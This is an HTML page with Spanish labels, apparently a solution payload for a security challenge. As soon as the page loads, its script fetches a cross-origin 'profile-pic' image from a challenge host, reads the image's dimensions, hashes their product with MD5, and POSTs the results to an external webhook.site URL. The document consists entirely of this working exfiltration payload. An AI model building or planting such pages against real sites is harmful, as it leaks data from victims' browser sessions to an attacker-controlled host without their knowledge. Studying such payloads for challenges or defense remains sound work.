<!DOCTYPE html>
<html>
<body>
    <img id="testImage" crossorigin="anonymous">
    <div id="result">Esperando...</div>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <script>
        const img = document.getElementById('testImage');
        const result = document.getElementById('result');
        const WEBHOOK = 'https://webhook.site/1df096b4-f7f3-4016-9465-a065ce0c001c';
        
        // Enviar señal de inicio
        fetch(WEBHOOK, {method: 'POST', body: 'START'});
        
        img.onload = function() {
            const level = this.naturalWidth * this.naturalHeight;
            const md5 = CryptoJS.MD5(level.toString()).toString();
            
            result.innerHTML = `
                <h2>✅ ÉXITO</h2>
                <p>Ancho: ${this.naturalWidth}px</p>
                <p>Alto: ${this.naturalHeight}px</p>
                <p>Nivel: ${level}</p>
                <p>MD5: ${md5}</p>
            `;
            
            // Enviar datos
            fetch(WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    level: level,
                    md5: md5,
                    width: this.naturalWidth,
                    height: this.naturalHeight
                })
            });
        };
        
        img.onerror = function() {
            result.innerHTML = '❌ Error cargando imagen';
            fetch(WEBHOOK, {method: 'POST', body: 'ERROR_LOADING_IMAGE'});
        };
        
        // Cargar imagen
        img.src = 'https://chl-1dfb4575-8986-4f39-aa84-7713afa6f5b6-imagen-importante.softwareseguro.com.ar/profile-pic';
    </script>
</body>
</html>
